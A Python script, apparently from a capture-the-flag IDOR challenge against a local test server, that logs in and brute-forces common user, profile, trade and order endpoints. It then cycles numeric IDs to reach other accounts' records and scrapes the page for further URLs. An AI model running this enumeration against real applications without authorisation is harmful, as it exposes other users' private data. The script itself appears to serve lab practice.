import requests
import re
import urllib.parse

print("[+] FINAL ATTEMPT: BRUTE FORCE DISCOVERY")
print("=" * 80)

base_url = "http://127.0.0.1:32941/"
session = requests.Session()

# Login first
login_data = {'username': 'test'}
login_resp = session.post(base_url, data=login_data, timeout=10)

if login_resp.status_code not in [200, 302]:
    print("Login failed - stopping")
    exit()

print("[✓] Login successful")

# If all else fails, let's try brute-forcing common ID-based endpoints
# These are extremely common in IDOR challenges

brute_endpoints = [
    # Direct ID access
    'user', 'users', 'profile', 'account', 
    'trade', 'trades', 'order', 'orders',
    'portfolio', 'balance', 'statement',
    
    # Numeric ID patterns
    'user/1', 'users/1', 'profile/1', 'account/1',
    'trade/1', 'trades/1', 'order/1', 'orders/1',
    
    # With query params
    'user?id=1', 'profile?id=1', 'account?id=1',
    'trade?id=1', 'order?id=1',
    
    # API patterns
    'api/user/1', 'api/users/1', 'api/profile/1',
    'rest/user/1', 'rest/users/1', 'rest/profile/1',
]

print(f"\n[BRUTE FORCING {len(brute_endpoints)} COMMON PATTERNS]")
found_any = False

for endpoint in brute_endpoints:
    url = urllib.parse.urljoin(base_url, endpoint.lstrip('/'))
    
    try:
        resp = session.get(url, timeout=5)
        if resp.status_code not in [404]:
            found_any = True
            print(f"[FOUND] GET /{endpoint} → Status: {resp.status_code} (Length: {len(resp.content)}B)")
            
            # If we find one, try multiple IDs
            if '/1' in endpoint or '=1' in endpoint:
                for test_id in ['2', '3', '4', '5']:
                    test_url = url.replace('/1', f'/{test_id}').replace('=1', f'={test_id}')
                    try:
                        test_resp = session.get(test_url, timeout=3)
                        if test_resp.status_code not in [404]:
                            print(f"  → /{endpoint.replace('1', test_id)} → Status: {test_resp.status_code}")
                    except:
                        pass
    except:
        continue

if not found_any:
    print("[-] No endpoints found via brute force")
    print("\n[+] ANALYZING AUTHENTICATED PAGE IN DETAIL]")
    
    # Let's extract more info from the authenticated page
    # Look for any patterns that might indicate how IDs are used
    
    content = login_resp.text
    
    # Find all URLs in page source
    urls = re.findall(r'href=["\']([^"\']+)["\']', content)
    urls.extend(re.findall(r'action=["\']([^"\']+)["\']', content))
    urls.extend(re.findall(r'src=["\']([^"\']+)["\']', content))
    urls.extend(re.findall(r'url\(["\']?([^"\')]+)["\']?\)', content))
    
    # Also check for JavaScript fetch/XHR endpoints
    js_urls = re.findall(r'["\'](/[a-zA-Z0-9/_-]+)["\']', content)
    urls.extend(js_urls)
    
    unique_urls = list(set(urls))
    
    # Filter out external and static URLs
    app_urls = []
    for u in unique_urls:
        if u.startswith('http'):
            continue
        if any(ext in u.lower() for ext in ['.css', '.js', '.png', '.jpg', '.gif', '.ico']):
            continue
        if u.startswith('#'):
            continue
        app_urls.append(u)
    
    if app_urls:
        print(f"\n[EXTRACTED APPLICATION URLs]: {len(app_urls)}")
        for url in app_urls:
            print(f"  - {url}")
    else:
        print("\n[-] No application URLs found in page source")
        
        # Look for IDs in the content
        numbers = re.findall(r'[^\d](\d{1,5})[^\d]', content)
        unique_numbers = list(set(numbers))
        print(f"\n[EXTRACTED NUMBERS FROM PAGE]: {len(unique_numbers)}")
        if unique_numbers:
            print(f"  Numbers: {unique_numbers[:10]}")

print("\n" + "=" * 80)
print("[+] BRUTE FORCE DISCOVERY COMPLETE")
